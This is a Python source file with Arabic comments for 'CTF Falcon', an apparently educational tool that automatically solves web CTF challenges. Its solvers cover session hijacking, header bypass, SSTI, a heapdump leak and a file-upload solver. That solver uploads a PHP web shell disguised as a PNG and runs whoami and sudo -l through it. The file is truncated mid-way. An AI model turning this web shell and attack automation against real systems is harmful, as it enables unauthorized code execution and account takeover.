Warning: truncated output (original token count: 28916)
Total output lines: 2057

# -*- coding: utf-8 -*-
"""
CTF Falcon - Web Session Audit  (v2.3.0)
==============================================================================
موزِّع محلِّلات لتحديات الويب التعليمية المصرّح بها. يفحص الصفحة أولًا (recon)،
ثم يختار المحلل المناسب حسب الأدلة الفعلية فقط:

  - Old Sessions     : يعتمد على تحويل / → /login + كوكي جلسة، ثم /register
                       و/sessions — وكل خطوة مشروطة بدليل من الاستجابة السابقة.
  - Crack the Gate   : تعليق ROT13 يكشف ترويسة مطوّر + مسار دخول JSON بالبريد.
  - SSTI1            : نموذج POST فعلي؛ يثبت التقييم باختبار حسابي ثم يقرأ علم CTF.
  - n0s4n1ty 1       : نموذج رفع فعلي؛ يرفع web shell تعليميًا، ويتحقق من sudo قبل قراءة العلم.
  - غير معروف        : يعرض المكتشفات الفعلية دون تنفيذ أي مسار تلقائيًا.

مبادئ ثابتة:
  - لا تثبيت لمضيف/منفذ/علم. كل شيء من رابط الطالب.
  - قفل الأصل: كل الطلبات على أصل التحدي نفسه؛ التحويل لمضيف آخر يُرفض.
  - لا اتباع تلقائي للتحويلات: كل استجابة تُسجّل على حدة.
  - تصحيح الكوكيز محفوظ: Max-Age <= 0 = طلب حذف.
  - لا تخمين كلمات مرور ولا مسح مسارات. الأدلة المتاحة فقط؛ SSTI يتطلب نموذج POST مكتشفًا.
  - لا ادعاء نجاح أو علمًا عند الفشل؛ ولا عرض لكلمات المرور أو قيم الجلسات.

نقطة الدخول العامة: run_audit(url, **options) -> dict  (يستدعيها falcon_local.py)
==============================================================================
"""
from __future__ import annotations

import json
import ast
import re
import ssl
import sys
import http.client
import secrets
import codecs
import hashlib
import html as html_lib
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from urllib.parse import urlsplit, urlencode, urljoin, quote

__version__ = "2.20.0"

# --------------------------------------------------------------------------- #
DEFAULT_FLAG_PATTERNS = [
    r"academy\{[^}]+\}",          # صيغة منصة Cylab Academy
    r"picoCTF\{[^}]+\}",
    r"flag\{[^}]+\}",
    r"FLAG\{[^}]+\}",
    r"CTF\{[^}]+\}",
]
DEFAULT_TIMEOUT = 15
MAX_BODY = 2 * 1024 * 1024
MAX_HEAPDUMP_BODY = 32 * 1024 * 1024
TEST_PASSWORD = "falcon-nonsensitive-test"   # كلمة مرور تجريبية، لا تُسجَّل أبدًا
USER_AGENT = f"CTF-Falcon-WebAudit/{__version__} (educational; authorized-CTF-only)"


# --------------------------------------------------------------------------- #
#  عميل HTTP: لا يتبع التحويلات، يقفل الأصل، يحفظ الكوكيز يدويًا                 #
# --------------------------------------------------------------------------- #
class HttpClient:
    def __init__(self, timeout=DEFAULT_TIMEOUT, insecure_tls=False):
        self.timeout = timeout
        self.insecure_tls = insecure_tls
        self.cookies: dict[str, str] = {}
        self.origin = None

    def cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def apply_set_cookies(self, analyzed_cookies: list[dict]) -> list[str]:
        notes = []
        for c in analyzed_cookies:
            name = c["name"]
            if c["intent"] == "deletion":
                if name in self.cookies:
                    del self.cookies[name]
                    notes.append(f"حُذفت الكوكي «{name}» بناءً على طلب الخادم (Max-Age<=0 أو Expires ماضٍ).")
                else:
                    notes.append(f"طلب الخادم حذف كوكي «{name}» غير موجودة لدينا.")
            else:
                self.cookies[name] = c["value"]
                notes.append(f"خُزّنت/حُدّثت الكوكي «{name}».")
        return notes

    def request(self, method: str, url: str, body: str | bytes | None = None,
                extra_headers: dict | None = None, max_body: int = MAX_BODY) -> dict:
        parts = urlsplit(url)
        scheme = parts.scheme or "http"
        host = parts.hostname
        port = parts.port or (443 if scheme == "https" else 80)
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query

        # قفل الأصل: لا مصادقة مضمّنة، ولا انتقال لمضيف مختلف
        origin = (scheme, host, port)
        if parts.username or parts.password or scheme not in ("http", "https"):
            raise ValueError("Invalid challenge URL")
        if self.origin is not None and self.origin != origin:
            raise ValueError("Cross-origin challenge request blocked")
        self.origin = origin

        if scheme == "https":
            ctx = ssl.create_default_context()
            if self.insecure_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=self.timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=self.timeout)

        headers = {
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/json,*/*",
            "Connection": "close",
        }
        if self.cookies:
            headers["Cookie"] = self.cookie_header()
        if body is not None:
            if isinstance(body, bytes):
                headers["Content-Type"] = "application/octet-stream"
                headers["Content-Length"] = str(len(body))
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Content-Length"] = str(len(body.encode("utf-8")))
        if extra_headers:
            headers.update(extra_headers)   # يسمح بتجاوز Content-Type لـ JSON

        try:
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            raw_headers = resp.getheaders()
            raw_body = resp.read(max_body + 1)
            if len(raw_body) > max_body:
                raise ValueError(f"Response exceeds {max_body} bytes")
            status = resp.status
            reason = resp.reason
        finally:
            conn.close()

        text = raw_body.decode("utf-8", errors="replace")
        set_cookie_raw = [v for (k, v) in raw_headers if k.lower() == "set-cookie"]
        location = next((v for (k, v) in raw_headers if k.lower() == "location"), None)
        ctype = next((v for (k, v) in raw_headers if k.lower() == "content-type"), "")

        return {
            "method": method, "url": url, "request_cookies": dict(self.cookies),
            "status": status, "reason": reason, "location": location,
            "content_type": ctype, "set_cookie_raw": set_cookie_raw,
            "headers": raw_headers, "body": text,
        }


# --------------------------------------------------------------------------- #
#  تحليل الكوكيز (تصحيح Max-Age محفوظ)                                          #
# --------------------------------------------------------------------------- #
def _parse_cookie_attrs(raw: str):
    segments = [s.strip() for s in raw.split(";") if s.strip() != ""]
    if not segments:
        return "", "", {}
    first = segments[0]
    if "=" in first:
        name, value = first.split("=", 1)
    else:
        name, value = first, ""
    attrs = {}
    for seg in segments[1:]:
        if "=" in seg:
            k, v = seg.split("=", 1)
            attrs[k.strip().lower()] = v.strip()
        else:
            attrs[seg.strip().lower()] = True
    return name.strip(), value.strip(), attrs


def analyze_set_cookie(raw: str) -> dict:
    name, value, attrs = _parse_cookie_attrs(raw)
    notes: list[str] = []
    intent = "set"
    lifetime_seconds = None
    expires_dt = None
    now = datetime.now(timezone.utc)

    if "max-age" in attrs and attrs["max-age"] is not True:
        try:
            ma = int(str(attrs["max-age"]).strip())
            lifetime_seconds = ma
            if ma <= 0:
                intent = "deletion"
                notes.append("Max-Age <= 0: هذا طلب حذف للكوكي (وليست دائمة).")
            else:
                notes.append(f"Max-Age = {ma} ثانية: عمر محدد للكوكي في المتصفح.")
        except ValueError:
            notes.append("قيمة Max-Age غير صالحة؛ تم تجاهلها.")

    if "expires" in attrs and attrs["expires"] is not True:
        try:
            expires_dt = parsedate_to_datetime(str(attrs["expires"]))
            if expires_dt.tzinfo is None:
                expires_dt = expires_dt.replace(tzinfo=timezone.utc)
            if intent != "deletion" and lifetime_seconds is None:
                if expires_dt <= now:
                    intent = "deletion"
                    notes.append("Expires في الماضي: الكوكي منتهية/محذوفة.")
                else:
                    years = (expires_dt - now).days / 365.25
                    notes.append(f"Expires في المستقبل (~{years:.1f} سنة): كوكي دائمة على المتصفح.")
                    notes.append("تنبيه: تاريخ الانتهاء البعيد وحده لا يثبت أن جلسة المصادقة "
                                 "لا تنتهي على الخادم؛ يجب التحقق من سلوك الخادم.")
        except (TypeError, ValueError):
            notes.append("تعذّر تحليل قيمة Expires؛ تم تجاهلها.")

    if intent == "set" and lifetime_seconds is None and expires_dt is None:
        notes.append("لا Max-Age ولا Expires: كوكي جلسة تُحذف بإغلاق المتصفح.")
    if intent == "deletion" and value == "":
        notes.append("القيمة فارغة مع نية الحذف: إزالة واضحة للكوكي.")

    hardening = []
    if "httponly" not in attrs:
        hardening.append("HttpOnly غائبة: الكوكي مقروءة بـ JavaScript (ملاحظة منفصلة).")
    if "secure" not in attrs:
        hardening.append("Secure غائبة: قد تُرسل عبر HTTP غير المشفّر (ملاحظة منفصلة).")
    if "samesite" not in attrs:
        hardening.append("SameSite غير محددة: اعتبارات CSRF (ملاحظة منفصلة).")
    if hardening:
        hardening.append("أيٌّ من هذه وحده لا يثبت إمكانية استخراج العلم.")

    return {
        "raw": raw, "name": name, "value": value, "attrs": attrs,
        "intent": intent, "lifetime_seconds": lifetime_seconds,
        "expires": expires_dt.isoformat() if expires_dt else None,
        "httponly": "httponly" in attrs, "secure": "secure" in attrs,
        "samesite": attrs.get("samesite") if "samesite" in attrs else None,
        "notes_ar": notes, "hardening_ar": hardening,
    }


def analyze_response_cookies(resp: dict) -> list[dict]:
    return [analyze_set_cookie(raw) for raw in resp.get("set_cookie_raw", [])]


# --------------------------------------------------------------------------- #
#  أدوات فحص الصفحة (recon)                                                     #
# --------------------------------------------------------------------------- #
def rot13(s: str) -> str:
    return codecs.encode(s, "rot_13")


_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
_FETCH_RE = re.compile(r"""fetch\s*\(\s*['"]([^'"]+)['"]""", re.I)
_INPUT_NAME_RE = re.compile(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
_TEXTAREA_NAME_RE = re.compile(r'<textarea[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
_FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
_ACTION_RE = re.compile(r'\baction\s*=\s*["\']([^"\']*)["\']', re.I)
_FMETHOD_RE = re.compile(r'\bmethod\s*=\s*["\']([^"\']*)["\']', re.I)

# ترويسة مطوّر داخل نص التعليق، مثل:  header "X-Dev-Access: yes"  أو  X-Foo: bar
_HEADER_HINT_RES = [
    re.compile(r'header[^"\']*["\']\s*([A-Za-z][A-Za-z0-9\-]*)\s*:\s*([^"\'\s]+)', re.I),
    re.compile(r'\b(X-[A-Za-z0-9\-]+)\s*:\s*([A-Za-z0-9_\-]+)', re.I),
]


def extract_comments(html: str) -> list[str]:
    return [m.group(1).strip() for m in _COMMENT_RE.finditer(html)]


def extract_emails(text: str) -> list[str]:
    seen, out = set(), []
    for m in _EMAIL_RE.finditer(text):
        e = m.group(0)
        if e not in seen:
            seen.add(e); out.append(e)
    return out


def find_form_fields(html: str) -> list[str]:
    return _INPUT_NAME_RE.findall(html)


def find_forms(html: str) -> list[dict]:
    forms = []
    for m in _FORM_RE.finditer(html):
        attrs, inner = m.group(1), m.group(2)
        action = (_ACTION_RE.search(attrs).group(1) if _ACTION_RE.search(attrs) else "")
        method = (_FMETHOD_RE.search(attrs).group(1).upper() if _FMETHOD_RE.search(attrs) else "GET")
        file_inputs = re.findall(r'<input\b(?=[^>]*\btype\s*=\s*["\']?file\b)[^>]*>', inner, re.I)
        file_fields = [m.group(1) for tag in file_inputs
                       for m in [re.search(r'\bname\s*=\s*["\']([^"\']+)', tag, re.I)] if m]
        enctype_m = re.search(r'\benctype\s*=\s*["\']([^"\']+)', attrs, re.I)
        forms.append({"action": action, "method": method,
                      "enctype": enctype_m.group(1).lower() if enctype_m else "",
                      "fields": _INPUT_NAME_RE.findall(inner) + _TEXTAREA_NAME_RE.findall(inner),
                      "file_fields": file_fields})
    return forms


def extract_login_fetch(html: str) -> dict | None:
    """
    يحلّل استدعاءات fetch في السكربتات الداخلية ويعيد أول مسار دخول
    يرسل JSON يحتوي email/password (أو ما يشبهه).
    """
    for m in _FETCH_RE.finditer(html):
        path = m.group(1)
        # Bound options to this fetch call, respecting strings and nested objects.
        start = html.find("(", m.start())
        depth, quote, escaped, end = 0, None, False, len(html)
        for i in range(start, len(html)):
            ch = html[i]
            if quote:
                if escaped:
                    escaped = False
                elif ch == "\\":
                    escaped = True
                elif ch == quote:
                    quote = None
                continue
            if ch in ("'", '"', "`"):
                quote = ch
            elif ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    end = i
                    break
        window = html[m.end():end]
        low = window.lower()
        field_text = low
        # JSON.stringify(data) may refer to fields declared before fetch.
        variable = re.search(r"json\.stringify\(\s*([a-z_$][\w$]*)\s*\)", low)
        if variable:
            script_start = html.lower().rfind("<script", 0, m.start())
            prefix = html[script_start if script_start >= 0 else m.start():m.start()]
            declaration = re.search(r"\b(?:const|let|var)\s+" + re.escape(variable.group(1)) + r"\s*=\s*\{([^{}]*)\}", prefix, re.I | re.S)
            if declaration:
                field_text += " {" + declaration.group(1).lower() + "}"

        is_json = "application/json" in low or "json.stringify" in low
        if re.search(r"method\s*:\s*['\"]post['\"]", low):
            method = "POST"
        elif "json.stringify" in low:
            method = "POST"
        else:
            method = "GET"
        fields = []
        for f in ("email", "password", "username", "user", "pass"):
            if re.search(r"['\"]?" + f + r"['\"]?\s*:", field_text) or re.search(r"(?:\{|,)\s*" + f + r"\s*(?=,|\})", field_text):
                fields.append(f)
        reads = [k for k in ("success", "flag", "token", "error")
                 if re.search(r"\.\s*" + k + r"\b", low) or ("'" + k + "'" in low) or ('"' + k + '"' in low)]
        if ("email" in fields or "username" in fields) and ("password" in fields or "pass" in fields):
            return {"path": path, "method": method or "POST", "json": is_json, "fields": fields, "reads": reads}
    return None


def find_sessions_hint(html: str) -> str | None:
    m = re.search(r'strange page at\s+(/[\w\-/\.]*)', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'\bat\s+(/sessions\b[\w\-/\.]*)', html, re.I)
    if m:
        return m.group(1)
    if "/sessions" in html:
        return "/sessions"
    return None


_SESSION_LINE_RE = re.compile(r'session\s*:\s*([^\s,<]+)\s*,\s*(\{.*?\}|.+?)(?:</p>|<br|\n|$)', re.I | re.S)


def parse_sessions_dump(html: str) -> list[dict]:
    entries = []
    for m in _SESSION_LINE_RE.finditer(html):
        entries.append({"token": m.group(1).strip().strip(","), "decoded": m.group(2).strip()})
    return entries


_ADMIN_HINTS = [
    (re.compile(r"['\"]admin['\"]\s*:\s*true", re.I), 5),
    (re.compile(r"\badmin\s*=\s*true", re.I), 5),
    (re.compile(r"['\"](?:username|user|name)['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
    (re.compile(r"['\"]role['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
    (re.compile(r"['\"]is_admin['\"]\s*:\s*true", re.I), 5),
    (re.compile(r"\badmin\b", re.I), 1),
]


def pick_admin_entry(entries: list[dict], own_token: str | None) -> dict | None:
    best, best_score = None, 0
    for e in entries:
        if own_token and e["token"] == own_token:
            continue
        score = sum(w for rx, w in _ADMIN_HINTS if rx.search(e["decoded"]))
        if score > best_score:
            best, best_score = e, score
    if best is None:
        for e in entries:
            if not own_token or e["token"] != own_token:
                return e
    return best


def extract_flag(bodies: list[tuple[str, str]], patterns: list[str]) -> tuple[str | None, str | None]:
    compiled = [re.compile(p) for p in patterns]
    for label, body in bodies:
        for rx in compiled:
            mm = rx.search(body)
            if mm:
                return mm.group(0), label
    return None, None


def _mask(value: str | None, keep: int = 4) -> str | None:
    if not value:
        return value
    return value[:keep] + "…" if len(value) > keep else "…"


# --------------------------------------------------------------------------- #
#  المُسجِّل: يسجّل كل استجابة مع تحليل الكوكيز، ويُخفي قيم الجلسات في السجل      #
# --------------------------------------------------------------------------- #
def _make_recorder(client, steps, bodies_for_flag):
    def record(resp, note_lines):
        analyzed = analyze_response_cookies(resp)
        jar_notes = client.apply_set_cookies(analyzed)
        masked_req = {k: _mask(v) for k, v in resp["request_cookies"].items()}  # لا قيم كاملة في السجل
        step = {
            "n": len(steps) + 1,
            "method": resp["method"], "url": resp["url"],
            "request_cookies": masked_req,
            "status": resp["status"], "reason": resp["reason"], "location": resp["location"],
            "set_cookies": analyzed, "body_snippet": resp["body"][:600],
            "notes_ar": note_lines + jar_notes,
        }
        steps.append(step)
        bodies_for_flag.append((f"step{step['n']}:{resp['method']} {urlsplit(resp['url']).path}", resp["body"]))
        return step
    return record


def _base_result(origin, challenge, analyzer, recognized):
    return {
        "tool": "CTF Falcon - Web Session Audit", "version": __version__,
        "challenge": challenge, "analyzer": analyzer, "recognized": recognized,
        "target": origin, "started_at": datetime.now(timezone.utc).isoformat(),
        "success": False, "flag": None, "flag_source": None,
        "steps": [], "explanation_ar": [], "warnings": [], "discovered": {},
        "note": "أداة تعليمية لتحديات CTF المصرّح بها فقط؛ لا تُرسل العلم تلقائيًا.",
    }


# --------------------------------------------------------------------------- #
#  الفحص الأولي (recon)                                                         #
# --------------------------------------------------------------------------- #
def do_recon(client, origin, record) -> dict:
    r = client.request("GET", origin)
    record(r, ["فحص الصفحة: قراءة التعليقات والنماذج وطلبات fetch."])
    html = r["body"]
    decoded = [{"raw": c, "rot13": rot13(c)} for c in extract_comments(html)]
    return {
        "resp": r, "html": html,
        "decoded_comments": decoded,
        "emails": extract_emails(html),
        "forms": find_forms(html),
        "login_fetch": extract_login_fetch(html),
    }


# --------------------------------------------------------------------------- #
#  كشف الأنماط                                                                   #
# --------------------------------------------------------------------------- #
def _find_dev_header(decoded_comments):
    """يبحث عن ترويسة مطوّر داخل التعليقات (بعد ROT13 أو خامًا)."""
    for c in decoded_comments:
        for text_kind in ("rot13", "raw"):
            text = c[text_kind]
            for rx in _HEADER_HINT_RES:
                m = rx.search(text)
                if m:
                    name, val = m.group(1), m.group(2)
                    return ({"name": name, "value": val},
                            c["raw"],
                            c["rot13"] if text_kind == "rot13" else c["raw"])
    return None, None, None


def detect_crack_the_gate(recon):
    dev_header, comment_raw, comment_decoded = _find_dev_header(recon["decoded_comments"])
    if not dev_header:
        return None
    lf = recon["login_fetch"]
    login_path, method, is_json, fields = None, "POST", True, []
    if lf:
        login_path, method, is_json, fields = lf["path"], lf["method"], lf["json"], lf["fields"]
    else:
        for f in recon["forms"]:
            if "email" in f["fields"] and f["action"]:
                login_path, method, is_json, fields = f["action"], f["method"], False, f["fields"]
                break
    if not login_path:
        return None
    return {
        "dev_header": dev_header, "comment_raw": comment_raw, "comment_decoded": comment_decoded,
        "login_path": login_path, "method": method, "json": is_json, "fields": fields,
    }



def detect_ssti1(recon):
    """Recognize a server template challenge only when a real POST form has fields."""
    for form in recon.get("forms", []):
        fields = form.get("fields") or []
        field = next((f for f in fields if f.lower() in {"content", "announcement", "message"}), None)
        if form.get("method") == "POST" and field and re.search(r"\b(announce|announcement|what do you want)\b", recon.get("html", ""), re.I):
            return {"action": form.get("action") or "/", "field": field,
                    "fields": fields, "method": "POST"}
    return None


def detect_n0s4n1ty(recon):
    """Recognize the file upload challenge only from an actual multipart file form."""
    for form in recon.get("forms", []):
        files = form.get("file_fields") or []
        if form.get("method") == "POST" and files and (
                "multipart/form-data" in form.get("enctype", "") or
                re.search(r"profile|picture|upload|file", recon.get("html", ""), re.I)):
            return {"action": form.get("action") or "/", "field": files[0],
                    "file_fields": files, "method": "POST"}
    return None


_ANCHOR_RE = re.compile(r"<a\b([^>]*)>(.*?)</a\s*>", re.I | re.S)
_HREF_RE = re.compile(r"\bhref\s*=\s*['\"]([^'\"]+)['\"]", re.I)
_SCRIPT_SRC_RE = re.compile(r"<script\b[^>]*\bsrc\s*=\s*['\"]([^'\"]+)['\"][^>]*>", re.I)


def detect_head_dump(recon):
    """Only enter this analyzer when the homepage links to its API documentation."""
    page = recon.get("html", "")
    for attrs, inner in _ANCHOR_RE.findall(page):
        href = _HREF_RE.search(attrs)
        label = re.sub(r"<[^>]*>", " ", inner)
        label = html_lib.unescape(re.sub(r"\s+", " ", label)).strip()
        if href and "api documentation" in label.lower() and "api-docs" in href.group(1).lower():
            return {"documentation_link": html_lib.unescape(href.group(1)), "label": label}
    return None


def _get_with_observed_redirects(client, url, record, note, max_redirects=3,
                                max_body=MAX_BODY):
    """GET a discovered URL and explicitly record bounded, same-origin redirects."""
    current = url
    for index in range(max_redirects + 1):
        response = client.request("GET", current, max_body=max_body)
        record(response, [note if index == 0 else "اتباع تحويل GET معلَن داخل أصل التحدي."])
        if response["status"] not in (301, 302, 303, 307, 308) or not response.get("location"):
            return response
        next_url = urljoin(current, response["location"])
        old, new = urlsplit(current), urlsplit(next_url)
        if (old.scheme, old.netloc) != (new.scheme, new.netloc):
            raise ValueError("Cross-origin redirect blocked")
        current = next_url
    raise ValueError("Too many same-origin redirects")


def solve_head_dump(client, origin, recon, ev, steps, record,
                    flag_patterns) -> dict:
    res = _base_result(origin, "head-dump", "head-dump", recognized=True)
    res["steps"] = steps
    res["discovered"] = {"documentation_link": ev["documentation_link"]}
    res["explanation_ar"].append(
        "تتبع صقر رابط «API Documentation» الموجود في الصفحة؛ لن يجرّب مسارات غير موثقة.")
    docs_url = urljoin(origin, ev["documentation_link"])
    try:
        docs = _get_with_observed_redirects(
            client, docs_url, record, "فتح رابط توثيق API المكتشف في الصفحة الرئيسية.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر فتح رابط توثيق API: {e}.")
        return res
    if not 200 <= docs["status"] < 300:
        res["warnings"].append(f"أعاد رابط توثيق API الحالة HTTP {docs['status']}.")
        return res

    script_src = next((src for src in _SCRIPT_SRC_RE.findall(docs["body"])
                       if "swagger-ui-init" in src.lower()), None)
    if script_src:
        spec_url = urljoin(docs["url"], html_lib.unescape(script_src))
        try:
            spec = _get_with_observed_redirects(
                client, spec_url, record, "قراءة ملف إعداد Swagger المرتبط بصفحة التوثيق.")
        except (OSError, http.client.HTTPException, ValueError) as e:
            res["warnings"].append(f"تعذّر قراءة ملف إعداد Swagger: {e}.")
            return res
        if not 200 <= spec["status"] < 300:
            res["warnings"].append(f"أعاد ملف إعداد Swagger الحالة HTTP {spec['status']}.")
            return res
        spec_text, spec_source = spec["body"], spec_url
    else:
        # Some Swagger installations embed their API document directly in the HTML.
        spec_text, spec_source = docs["body"], docs_url

    route_match = re.search(r"['\"](/heapdump)['\"]\s*:\s*\{", spec_text, re.I)
    if not route_match:
        res["explanation_ar"].append("لم يعرض التوثيق المفتوح مسار heapdump صراحةً؛ لم يُطلب أي مسار آخر.")
        res["warnings"].append("تعذّر إثبات مسار تفريغ الذاكرة من مستندات API المكتشفة.")
        return res
    heap_path = route_match.group(1)
    heap_url = urljoin(spec_source, heap_path)
    res["discovered"]["swagger_source"] = spec_url if script_src else None
    res["discovered"]["heapdump_path"] = heap_path
    res["explanation_ar"].append(
        f"توثيق Swagger يعرّف GET {heap_path}؛ سيُقرأ الملف بهذا المسار الموثّق فقط.")
    try:
        dump = _get_with_observed_redirects(
            client, heap_url, record,
            "تنزيل heap snapshot من endpoint الموثق في Swagger (حد الاستجابة 32 MiB).",
            max_body=MAX_HEAPDUMP_BODY)
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر تنزيل ملف heap snapshot: {e}.")
        return res
    res["discovered"]["heapdump_status"] = dump["status"]
    res["discovered"]["heapdump_bytes"] = len(dump["body"].encode("utf-8", errors="replace"))
    disposition = next((v for k, v in dump["headers"] if k.lower() == "content-disposition"), "")
    filename = re.search(r"filename\s*=\s*[\"']?([^\"';]+)", disposition, re.I)
    if filename:
        res["discovered"]["artifact_filename"] = filename.group(1)
    if not 200 <= dump["status"] < 300:
        res["warnings"].append(f"أعاد heapdump الحالة HTTP {dump['status']}.")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:heapdump", dump["body"])], flag_patterns)
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append(
            "عُثر على العلم داخل استجابة heap snapshot الفعلية؛ يوضح هذا التحدي خطر كشف بيانات الذاكرة.")
    else:
        res["warnings"].append(
            "تم تنزيل heap snapshot بنجاح لكن لم يظهر نمط علم معروف؛ راجع حجم الملف أو صيغة العلم.")
    return res


def _multipart_file(boundary: str, field: str, filename: str,
                    content_type: str, content: bytes) -> bytes:
    """Build one RFC 7578 file part; challenge payload is fixed and noninteractive."""
    head = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n").encode("utf-8")
    return head + content + f"\r\n--{boundary}--\r\n".encode("ascii")


_UPLOAD_PATH_RE = re.compile(r"(?:href=[\"']?)([^\"'<> ]*uploads/[^\"'<> ]+\.php)|((?:[\w./-]*uploads/)[\w.-]+\.php)", re.I)


def _uploaded_shell_path(body: str, filename: str) -> str | None:
    for m in _UPLOAD_PATH_RE.finditer(body):
        candidate = next((g for g in m.groups() if g), None)
        if candidate:
            return candidate
    if re.search(r"uploaded|success", body, re.I) and filename in body:
        return "uploads/" + filename
    return None


def solve_n0s4n1ty(client, origin, recon, ev, steps, record,
                   flag_patterns) -> dict:
    res = _base_result(origin, "n0s4n1ty 1", "n0s4n1ty-1", recognized=True)
    res["steps"] = steps
    res["discovered"] = {"form_action": ev["action"], "file_field": ev["field"],
                         "file_fields": ev["file_fields"]}
    res["explanation_ar"].append(
        f"اكتُشف نموذج رفع POST بحقل الملف «{ev['field']}». سيُرفع ملف PHP محدود لتنفيذ أوامر هذا التحدي فقط.")
    endpoint = urljoin(origin, ev["action"])
    filename = "falcon_cmd.php"
    boundary = "----FalconCTF" + secrets.token_hex(12)
    payload = b"<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
    body = _multipart_file(boundary, ev["field"], filename, "image/png", payload)
    try:
        upload = client.request("POST", endpoint, body=body,
                                extra_headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        record(upload, ["رفع ملف PHP باسم falcon_cmd.php إلى حقل الملف المكتشف؛ لم تُرسل أوامر قبل تأكيد مسار الرفع."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر إرسال الملف إلى نموذج الرفع: {e}.")
        return res
    res["discovered"]["upload_status"] = upload["status"]
    security_page = bool(re.search(
        r"Kaspersky Endpoint Security|Request has been forbidden by antivirus|forbidden by antivirus",
        upload["body"], re.I))
    if security_page:
        res["discovered"]["upload_blocked_by_security"] = "Kaspersky Endpoint Security"
        res["explanation_ar"].append(
            "الاستجابة صفحة حظر من Kaspersky، وليست ردّ تطبيق التحدي؛ لم يصل تأكيد الرفع إلى الموقع.")
        res["warnings"].append(
            "اعترض Kaspersky الطلب محليًا (HTTP 499). هذا لا يثبت أن الموقع رفض الملف. أوقف صقر المحاولة؛ استخدم بيئة التحدي المعتمدة أو اطلب من مسؤول الشبكة مراجعة السماح بالاتصال بنطاق التحدي. لا تغيّر الحمولة لتجاوز الحماية.")
        return res
    upload_path = _uploaded_shell_path(upload["body"], filename)
    res["discovered"]["upload_path"] = upload_path
    if not (200 <= upload["status"] < 300) or not upload_path:
        snippet = re.sub(r"\s+", " ", upload["body"][:240]).strip()
        res["explanation_ar"].append("لم يؤكد رد الخادم نجاح الرفع أو يعرض مسار الملف؛ أُوقف التنفيذ هنا.")
        res["warnings"].append(f"رد الرفع HTTP {upload['status']}: {snippet or '[استجابة فارغة]'}. تحقق من نوع الملف وحقل الرفع ثم أعد المحاولة.")
        return res
    shell_url = urljoin(origin, upload_path)
    shell_parts, origin_parts = urlsplit(shell_url), urlsplit(origin)
    if (shell_parts.scheme, shell_parts.netloc) != (origin_parts.scheme, origin_parts.netloc):
        res["warnings"].append("رفض صقر مسار الملف لأنه خرج عن أصل التحدي.")
        return res
    res["explanation_ar"].append(f"أكّد الخادم رفع الملف في المسار «{upload_path}»؛ نتحقق الآن من تنفيذ PHP.")

    def run_command(command, note):
        url = shell_url + ("&" if "?" in shell_url else "?") + "cmd=" + quote(command, safe="")
        response = client.request("GET", url)
        record(response, [note])
        return response

    try:
        who = run_command("whoami", "اختبار تنفيذ الأمر whoami عبر الملف المرفوع.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر التحقق من الملف المرفوع: {e}.")
        return res
    if not (200 <= who["status"] < 300) or not who["body"].strip():
        res["warnings"].append("لم يُظهر الملف المرفوع ناتج whoami؛ لم تُنفّذ أوامر sudo.")
        return res
    res["discovered"]["web_user"] = re.sub(r"\s+", " ", who["body"]).strip()[:100]
    res["explanation_ar"].append("استجاب ملف PHP لطلب whoami؛ نفحص الآن صلاحيات sudo كما يوصي التحدي.")
    try:
        sudo = run_command("sudo -l", "فحص sudo -l؛ لا تُقرأ ملفات /root إلا إذا أثبت الرد صلاحية NOPASSWD.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر فحص صلاحيات sudo: {e}.")
        return res
    …10916 tokens truncated…),
               ["أرسل صقر بيانات الاعتماد المطابقة للمصدر إلى نموذج POST المكتشف؛ حُجبت القيم من السجل."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذر إرسال بيانات الدخول المكتشفة: {e}")
        return res
    if not (reflected_user and reflected_pass and form_evidence and hash_input):
        res["warnings"].append("لم يؤكد رد login.php بيانات الدخول ونموذج المشرف المخفي؛ توقف صقر.")
        return res

    admin_url = urljoin(login_url, form_evidence["action"])
    if urlsplit(admin_url).netloc != urlsplit(origin).netloc:
        res["warnings"].append("حُظر نموذج المشرف الذي يشير إلى أصل آخر.")
        return res
    admin_data = _hidden_form_values(login_html)
    for field in form_evidence["fields"]:
        if field.lower() == "hash":
            admin_data[field] = hash_input
    if not any(k.lower() == "hash" for k in admin_data):
        res["warnings"].append("تعذر تحديد حقل hash في نموذج المشرف.")
        return res
    try:
        admin_response = client.request("POST", admin_url, urlencode(admin_data))
        record(_redact_response_body(admin_response, [username, password, hash_input]),
               ["أرسل صقر قيمة الحقل من نموذج المشرف الذي أعاده التطبيق، ثم فحص الرد للعلم."])
    except (OSError, http.client.HTTPException, ValueError) as e:
